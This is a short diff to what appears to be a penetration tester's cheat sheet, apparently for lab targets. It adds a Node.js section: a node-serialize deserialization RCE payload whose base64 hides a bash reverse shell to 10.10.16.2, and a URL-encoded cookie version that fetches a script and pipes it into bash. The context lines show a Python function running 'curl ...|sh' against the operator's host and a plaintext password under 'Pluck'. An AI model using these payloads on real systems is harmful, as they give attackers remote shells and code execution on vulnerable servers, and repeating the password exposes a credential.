@@ -358,6 +358,11 @@ def rev():
     subprocess.Popen("curl http://$MYIP:8888/resh|sh", shell=True)
     return ""
 
+[*] Node.js
+echo 'bash -i >& /dev/tcp/$MYIP/5555 0>&1' | base64
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('echo YmFzaCAtaSAJiAvZGV2L3RjcC8xMC4xMC4xNi4yLzU1NTUgMD4mMQo=|base64 -d|bash', function(error, stdout, stderr){console.log(stdout)});}()"}
+Cookie: auth=%7b%22%72%63%65%22%3a%22%5f%24%24%4e%44%5f%46%55%4e%43%24%24%5f%66%75%6e%63%74%69%6f%6e%28%29%7b%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%65%63%68%6f%20%59%33%56%79%62%43%41%78%4d%43%34%78%4d%43%34%78%4e%69%34%79%4f%6a%67%34%4f%44%67%76%63%6d%56%7a%61%41%6f%3d%20%7c%62%61%73%65%36%34%20%2d%64%7c%62%61%73%68%27%2c%20%66%75%6e%63%74%69%6f%6e%28%65%72%72%6f%72%2c%20%73%74%64%6f%75%74%2c%20%73%74%64%65%72%72%29%7b%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%73%74%64%6f%75%74%29%7d%29%3b%7d%28%29%22%7d
+
 [*] Pluck
 +---------- Set Password ----------+
 XPASSWORD=lexypoo97
